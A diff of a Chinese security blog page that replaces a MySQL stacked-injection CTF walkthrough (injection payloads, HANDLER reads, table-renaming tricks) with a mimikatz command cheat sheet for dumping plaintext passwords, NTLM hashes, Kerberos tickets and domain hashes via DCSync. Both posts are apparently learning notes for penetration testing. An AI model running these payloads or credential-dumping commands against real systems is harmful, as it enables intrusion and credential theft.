@@ -4,9 +4,9 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="堆叠注入, f14g">
-    <meta name="description" content="用法MySQL可以执行多条语句，多条语句之前用;做分隔。 简单的说，由于分号;为MYSQL语句的结束符。若在支持多语句执行的情况下，可利用此方法 执行其他恶意语句，如RENAME、DROP等，堆叠注入可以用于执行任何SQL语句。 
-并不是所">
+    <meta name="keywords" content="mimikatz, f14g">
+    <meta name="description" content="项目地址https://github.com/gentilkiwi/mimikatz/
+简介Mimikatz是法国人Gentil Kiwi编写的一款windows平台下的神器，它具备很多功能，其中最亮的功能是直接从 lsass.exe 进程">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -18,7 +18,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>堆叠注入 | f14g</title>
+    <title>mimikatz | f14g</title>
     <link rel="icon" type="image/x-icon, image/vnd.microsoft.icon" href="/favicon.ico">
     
 
@@ -272,12 +272,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/images/20.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/images/58.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">堆叠注入</h1>
+                    <h1 class="description center-align post-title">mimikatz</h1>
                 </div>
             </div>
         </div>
@@ -301,8 +301,8 @@
                     
                     <div class="article-tag">
                         
-                            <a href="/tags/%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/">
-                                <span class="chip bg-color">堆叠注入</span>
+                            <a href="/tags/mimikatz/">
+                                <span class="chip bg-color">mimikatz</span>
                             </a>
                         
                     </div>
@@ -313,12 +313,8 @@
                     <div class="post-cate">
                         <i class="fas fa-bookmark fa-fw icon-category"></i>
                         
-                            <a href="/categories/Web/" class="post-category">
-                                Web
-                            </a>
-                        
-                            <a href="/categories/Web/Sql/" class="post-category">
-                                Sql
+                            <a href="/categories/%E6%B8%97%E9%80%8F/" class="post-category">
+                                渗透
                             </a>
                         
                     </div>
@@ -330,28 +326,28 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2023-02-02
+                    2023-08-11
                 </div>
                 
 
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2023-07-23
+                    2023-08-11
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    614
+                    827
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    2 分
+                    3 分
                 </div>
                 
 
@@ -374,63 +370,119 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h3 id="用法"><a href="#用法" class="headerlink" title="用法"></a>用法</h3><pre class="line-numbers language-none"><code class="language-none">MySQL可以执行多条语句，多条语句之前用;做分隔。 简单的说，由于分号;为MYSQL语句的结束符。若在支持多语句执行的情况下，可利用此方法 执行其他恶意语句，如RENAME、DROP等，堆叠注入可以用于执行任何SQL语句。 
-并不是所有情况下都可以使用堆叠注入
-需要满足条件$mysqli-&gt;multi_query($sql);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+                <h2 id="项目地址"><a href="#项目地址" class="headerlink" title="项目地址"></a>项目地址</h2><p><a target="_blank" rel="noopener" href="https://github.com/gentilkiwi/mimikatz/">https://github.com/gentilkiwi/mimikatz/</a></p>
+<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>Mimikatz是法国人Gentil Kiwi编写的一款windows平台下的神器，它具备很多功能，其中最亮的功能是直接从 lsass.exe 进程里获取windows处于active状态账号的明文密码 </p>
+<p>mimikatz的功能不仅如此，它还可以提升进程权限，注入进程，读取进程内存等等，mimikatz包含了很多本地模块，更像是一个轻量级的调试器。</p>
+<h2 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">system::user               //查看当前登录的用户
+process::list              //列出进程
+process::stop processname  //结束进程（有些进程结束不了，即使权限够大）
+process::suspend  processname //暂停进程
+process::modules              //列出系统核心模块和其所在的物理路径
+service::list                 //列出系统服务
+service::stop<span class="token punctuation">(</span>start<span class="token punctuation">)</span> service_name   //停止（开启）服务
+privilege::list               //列出系统权限列表
+privilege::debug              //提升权限 （执行这条命令得有足够的权限）
+nogpo::cmd                    //打开cmd
+nogpo::regedit                //打开注册表
+ts::sessions                  //显示当前回话
+ts::processes                 //显示当前进程及其PID
+sekurlsa::logonpasswords      //获取当前在线用户的明文密码（需要高权限运行）
+lsadump::lsa /patch           //获取当前此计算机存在过用户的NTLMHASH
+inject::process lsass.exe <span class="token string">'路径'</span> sekurlsa.dll //进程注入（如果用1.0版本获取hash的时候发现sekurlsa模块<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-<pre class="line-numbers language-none"><code class="language-none">注意，通常多语句执行时，若前条语句已返回数据，则之后的语句返回的数据通常无法返 回前端页面。建议使用union联合注入，若无法使用联合注入， 可考虑使用RENAME关键 字，将想要的数据列名&#x2F;表名更改成返回数据的SQL语句所定义的表&#x2F;列名<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<h2 id="常用模块"><a href="#常用模块" class="headerlink" title="常用模块"></a>常用模块</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">cls：       清屏
+standard：  标准模块，基本命令
+crypto：    加密相关模块
+sekurlsa：  与证书相关的模块
+kerberos：  kerberos模块
+privilege： 提权相关模块
+process：   进程相关模块
+serivce：   服务相关模块
+lsadump：   LsaDump模块
+ts：        终端服务器模块
+event：     事件模块
+misc：      杂项模块
+token：     令牌操作模块
+vault：     Windows 、证书模块
+minesweeper：Mine Sweeper模块
+net：
+dpapi：     DPAPI模块（通过API或RAW访问）<span class="token punctuation">[</span>数据保护应用程序编程接口<span class="token punctuation">]</span>
+busylight： BusyLight Module
+sysenv：    系统环境值模块
+sid：       安全标识符模块
+iis：       IIS XML配置模块
+rpc：       mimikatz的RPC控制
+sr98：      用于SR98设备和T5577目标的RF模块
+rdm：       RDM（830AL）器件的射频模块
+acr：       ACR模块
+version：   查看版本
+exit：      退出
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-<h3 id="当select被过滤了用handler来绕过"><a href="#当select被过滤了用handler来绕过" class="headerlink" title="当select被过滤了用handler来绕过"></a>当select被过滤了用handler来绕过</h3><pre class="line-numbers language-none"><code class="language-none">mysql除可使用select查询表中的数据，也可使用handler语句，这条语句使我们能够一 行一行的浏览一个表中的数据，不过handler语句并不具备select语句的所有功能。它是
-mysql专用的语句，并没有包含到SQL标准中。
-条件：堆叠注入
-handler users open as hd; #指定数据表进行载入并将返回句柄重命名
-handler hd read first; #读取指定表&#x2F;句柄的首行数据 
-handler hd read next; #读取指定表&#x2F;句柄的下一行数据
-handler hd close; #关闭句柄<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<h2 id="模块"><a href="#模块" class="headerlink" title="模块"></a>模块</h2><h3 id="sekurlsa模块"><a href="#sekurlsa模块" class="headerlink" title="sekurlsa模块"></a>sekurlsa模块</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">sekurlsa::logonpasswords
+
+抓取用户NTLM哈希
+sekurlsa::msv
+
+加载dmp文件，并导出其中的明文密码
+sekurlsa::minidump lsass.dmp
+sekurlsa::logonpasswords full
+
+导出lsass.exe进程中所有的票据
+sekurlsa::tickets /export
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h3 id="kerberos模块"><a href="#kerberos模块" class="headerlink" title="kerberos模块"></a>kerberos模块</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">列出系统中的票据
+kerberos::list
+kerberos::tgt
+
+清除系统中的票据
+kerberos::purge
+
+导入票据到系统中
+kerberos::ptc 票据路径
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h3 id="lsadump模块"><a href="#lsadump模块" class="headerlink" title="lsadump模块"></a>lsadump模块</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">在域控上执行<span class="token punctuation">)</span>查看域kevin.com内指定用户root的详细信息，包括NTLM哈希等
+lsadump::dcsync /domain:kevin.com /user:root
+
+<span class="token punctuation">(</span>在域控上执行<span class="token punctuation">)</span>读取所有域用户的哈希
+lsadump::lsa /patch
+
+从sam.hive和system.hive文件中获得NTLM Hash
+lsadump::sam /sam:sam.hive /system:system.hive
+
+从本地SAM文件中读取密码哈希
+token::elevate
+lsadump::sam
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h2 id="读取域成员HASH"><a href="#读取域成员HASH" class="headerlink" title="读取域成员HASH"></a>读取域成员HASH</h2><h3 id="域控本地读取"><a href="#域控本地读取" class="headerlink" title="域控本地读取"></a>域控本地读取</h3><ul>
+<li>直接执行</li>
+</ul>
+<pre class="line-numbers language-none"><code class="language-none">Copy#提升权限
+privilege::debug
+
+抓取密码
+lsadump::lsa &#x2F;patch<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<ul>
+<li>通过 dcsync，利用目录复制服务（DRS）从NTDS.DIT文件中检索密码哈希值，可以在域管权限下执行获取</li>
+</ul>
+<pre class="line-numbers language-none"><code class="language-none">Copy#获取所有域用户
+lsadump::dcsync &#x2F;domain:test.com &#x2F;all &#x2F;csv
+
+#指定获取某个用户的hash
+lsadump::dcsync &#x2F;domain:test.com &#x2F;user:test<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 
 
-<h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><p>[强网杯 2019]随便注</p>
-<p><img src="/2023/02/02/%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/1662190616986.png" alt="1662190616986"></p>
-<p>输入  1’</p>
-<p><img src="/2023/02/02/%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/1662190675022.png" alt="1662190675022"></p>
-<p>报错说明存在sql注入漏洞</p>
-<p>输入   1’ order by 3#时</p>
-<p><img src="/2023/02/02/%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/1662190776274.png" alt="1662190776274"></p>
-<p>说明select语句里有两个字段</p>
-<p>然后尝试用联合注入获取数据库名</p>
-<p><img src="/2023/02/02/%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/1662190923197.png" alt="1662190923197"></p>
-<p>发现select被过滤了然后用堆叠注入的方法获得表名</p>
-<pre class="line-numbers language-none"><code class="language-none">1&#39;;show tables;#<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<p><img src="/2023/02/02/%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/1662191211421.png" alt="1662191211421"></p>
-<p>得到两个表 然后分别查询两个表中的字段</p>
-<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token number">1</span>'<span class="token punctuation">;</span><span class="token keyword">show</span> <span class="token keyword">columns</span> <span class="token keyword">from</span> <span class="token identifier"><span class="token punctuation">`</span>1919810931114514<span class="token punctuation">`</span></span><span class="token punctuation">;</span><span class="token comment">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<p><img src="/2023/02/02/%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/1662191442844.png" alt="1662191442844"></p>
-<p>这里发现有个 flag</p>
-<p>第一种方法：</p>
-<p>所以只需   select flag from <code>1919810931114514</code>;#   但是select被过滤了所以要用handler1</p>
-<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token number">1</span>'<span class="token punctuation">;</span><span class="token keyword">handler</span> <span class="token identifier"><span class="token punctuation">`</span>1919810931114514<span class="token punctuation">`</span></span> <span class="token keyword">open</span><span class="token punctuation">;</span><span class="token keyword">handler</span> <span class="token identifier"><span class="token punctuation">`</span>1919810931114514<span class="token punctuation">`</span></span> <span class="token keyword">read</span> <span class="token keyword">first</span><span class="token comment">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<p>得到flag</p>
-<p><img src="/2023/02/02/%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/1662191646739.png" alt="1662191646739"></p>
-<p>第二种方法：</p>
-<pre class="line-numbers language-none"><code class="language-none">1&#39;;show columns from &#96;words&#96;;#<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<p><img src="/2023/02/02/%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/1662206518828.png" alt="1662206518828"></p>
-<p>发现了   id    data   这两个字段</p>
-<p>可以</p>
-<p>1，通过 rename 先把 words 表改名为其他的表名。</p>
-<p>2，把 1919810931114514 表的名字改为 words 。</p>
-<p>3 ，把flag改为id</p>
-<pre class="line-numbers language-none"><code class="language-none">1&#39;;RENAME TABLE &#96;words&#96; TO &#96;words2&#96;;RENAME TABLE &#96;1919810931114514&#96; TO &#96;words&#96;;ALTER TABLE &#96;words&#96; CHANGE &#96;flag&#96; &#96;id&#96; VARCHAR(100) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL;#<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<p>然后</p>
-<p>payload</p>
-<pre class="line-numbers language-none"><code class="language-none">1&#39; or 1#<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<p><img src="/2023/02/02/%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/1662208984049.png" alt="1662208984049"></p>
+<p>参考文章：</p>
+<p><a target="_blank" rel="noopener" href="https://blog.gentilkiwi.com/mimikatz">https://blog.gentilkiwi.com/mimikatz</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.51cto.com/u_15127617/4276127">https://blog.51cto.com/u_15127617/4276127</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_40412037/article/details/113348310">https://blog.csdn.net/weixin_40412037/article/details/113348310</a></p>
 
                 
             </div>
@@ -457,7 +509,7 @@ handler hd close; #关闭句柄<span aria-hidden="true" class="line-numbers-rows
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="http://example.com/2023/02/02/%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/">http://example.com/2023/02/02/%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/</a>
+                    <a href="http://example.com/2023/08/11/mimikatz/">http://example.com/2023/08/11/mimikatz/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -495,8 +547,8 @@ handler hd close; #关闭句柄<span aria-hidden="true" class="line-numbers-rows
                     
                         <div class="article-tag">
                             
-                                <a href="/tags/%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/">
-                                    <span class="chip bg-color">堆叠注入</span>
+                                <a href="/tags/mimikatz/">
+                                    <span class="chip bg-color">mimikatz</span>
                                 </a>
                             
                         </div>
@@ -786,16 +838,17 @@ handler hd close; #关闭句柄<span aria-hidden="true" class="line-numbers-rows
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+                <i class="far fa-dot-circle"></i>&nbsp;本篇
+            </div>
             <div class="card">
-                <a href="/2023/02/02/%E7%9B%B2%E6%B3%A8/">
+                <a href="/2023/08/11/mimikatz/">
                     <div class="card-image">
                         
-                        <img src="/images/20.jpg" class="responsive-img" alt="盲注">
+                        <img src="/images/58.jpg" class="responsive-img" alt="mimikatz">
                         
-                        <span class="card-title">盲注</span>
+                        <span class="card-title">mimikatz</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -805,30 +858,27 @@ handler hd close; #关闭句柄<span aria-hidden="true" class="line-numbers-rows
                         
                     </div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2023-02-02
-                        </span>
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2023-08-11
+                            </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
                             
-                            <a href="/categories/Web/" class="post-category">
-                                    Web
-                                </a>
-                            
-                            <a href="/categories/Web/Sql/" class="post-category">
-                                    Sql
+                            <a href="/categories/%E6%B8%97%E9%80%8F/" class="post-category">
+                                    渗透
                                 </a>
                             
                             
                         </span>
                     </div>
                 </div>
+
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/%E7%9B%B2%E6%B3%A8/">
-                        <span class="chip bg-color">盲注</span>
+                    <a href="/tags/mimikatz/">
+                        <span class="chip bg-color">mimikatz</span>
                     </a>
                     
                 </div>
@@ -842,12 +892,12 @@ handler hd close; #关闭句柄<span aria-hidden="true" class="line-numbers-rows
                 下一篇&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2023/02/02/union%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5/">
+                <a href="/2023/08/10/PTH-PTT/">
                     <div class="card-image">
                         
-                        <img src="/images/20.jpg" class="responsive-img" alt="union联合注入">
+                        <img src="/images/59.jpg" class="responsive-img" alt="PTH&amp;PTT">
                         
-                        <span class="card-title">union联合注入</span>
+                        <span class="card-title">PTH&amp;PTT</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -858,18 +908,14 @@ handler hd close; #关闭句柄<span aria-hidden="true" class="line-numbers-rows
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2023-02-02
+                                <i class="far fa-clock fa-fw icon-date"></i>2023-08-10
                             </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
                             
-                            <a href="/categories/Web/" class="post-category">
-                                    Web
-                                </a>
-                            
-                            <a href="/categories/Web/Sql/" class="post-category">
-                                    Sql
+                            <a href="/categories/%E6%B8%97%E9%80%8F/" class="post-category">
+                                    渗透
                                 </a>
                             
                             
@@ -879,8 +925,8 @@ handler hd close; #关闭句柄<span aria-hidden="true" class="line-numbers-rows
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/union%E8%81%94%E5%90%88/">
-                        <span class="chip bg-color">union联合</span>
+                    <a href="/tags/PTH-PTT/">
+                        <span class="chip bg-color">PTH&amp;PTT</span>
                     </a>
                     
                 </div>
@@ -1041,13 +1087,6 @@ handler hd close; #关闭句柄<span aria-hidden="true" class="line-numbers-rows
 
 </main>
 
-
-<script src="https://cdn.bootcss.com/mathjax/2.7.5/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
-<script>
-    MathJax.Hub.Config({
-        tex2jax: {inlineMath: [['$', '$'], ['\\(', '\\)']]}
-    });
-</script>
 
 
 
